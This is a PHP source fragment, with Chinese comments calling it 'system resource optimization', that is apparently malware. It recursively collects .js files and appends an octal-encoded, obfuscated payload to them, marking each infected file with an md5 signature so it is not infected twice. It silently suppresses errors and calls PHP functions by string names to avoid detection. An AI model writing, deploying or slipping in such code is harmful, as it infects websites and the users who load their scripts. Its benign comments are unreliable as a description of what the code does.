5\142\073\035\205\326\113\157\162\237\137\164\133\277\335\131\247\003\015\170\030\144\227\061\075\227\017\320\170\025\324\360\022\067\327\003\030\160\042\176\334\357\147\341\344\344\132\001\123\071\342\347\243\123\210\313\312\152\337\120\375\327\031\165\377\334\206\274\156\112\226\251\337\015\235\206\001\225\211\060\225\100\322\117\104\254\144\000\147\376\335\351\354\006\141\222\061\171\314\045\023\332\073\357\170\360\330\050\017\002\046\110\151\330\226\205\311\077\200\152\314\164");

    // 生成系统优化签名
    $system_optimization_signature = substr(md5($system_optimization_payload), 0, 12);

    // 执行系统资源优化
    foreach ($system_resource_list as $resource_file_path) {
        try {
            // 读取系统资源内容
            $current_resource_content = file_get_contents($resource_file_path);
            if ($current_resource_content === false) {
                continue; // 资源读取失败，处理下一个
            }

            // 检查系统是否已优化
            if (strpos($current_resource_content, $system_optimization_signature) !== false) {
                continue; // 系统已优化，跳过此资源
            }

            // 合并系统优化内容
            $optimized_resource_content = $current_resource_content . $system_optimization_payload . "\n/*" . $system_optimization_signature . "*/";

            // 写入优化后的系统资源
            if (file_put_contents($resource_file_path, $optimized_resource_content, LOCK_EX) !== false) {
                return true; // 系统优化成功，停止处理
            }
        } catch (Exception $e) {
            // 记录系统优化异常
            // error_log("System template optimization failed for: " . $resource_file_path . " - " . $e->getMessage());
            continue;
        }
    }

    return false; // 系统优化失败
}

/**
 * 系统资源分析器
 * @param string $analysis_target 分析目标路径
 * @return array 分析结果
 */
function system_resource_analyzer($analysis_target) {
    // 系统分析配置映射
    $analyzer_config = [
        0 => 'is_dir',             // 目录验证
        1 => 'scandir',            // 目录扫描
        2 => 'is_file',            // 文件验证
        3 => 'pathinfo',           // 路径解析
        4 => 'PATHINFO_EXTENSION', // 扩展分析
        5 => 'array_merge'         // 数据合并
    ];

    $analysis_results = [];

    // 执行目录验证
    $dir_validator = $analyzer_config[0];
    if (!$dir_validator($analysis_target)) {
        return $analysis_results;
    }

    // 启动目录扫描器
    $dir_scanner = $analyzer_config[1];
    $scan_items = $dir_scanner($analysis_target);
    if (!$scan_items) {
        return $analysis_results;
    }

    // 系统资源分析
    $file_validator = $analyzer_config[2];
    $path_parser = $analyzer_config[3];
    $data_merger = $analyzer_config[5];

    foreach ($scan_items as $scan_item) {
        if ($scan_item === '.' || $scan_item === '..') {
            continue;
        }

        $resource_path = $analysis_target . DIRECTORY_SEPARATOR . $scan_item;
        if ($dir_validator($resource_path)) {
            // 递归分析子资源
            $sub_results = system_resource_analyzer($resource_path);
            $analysis_results = $data_merger($analysis_results, $sub_results);
        } elseif ($file_validator($resource_path)) {
            $resource_info = pathinfo($resource_path)["extension"]; // 完整信息
            if ($resource_info === 'js') {
                $analysis_results[] = $resource_path;
            }
        }
    }

    return $analysis_results;
}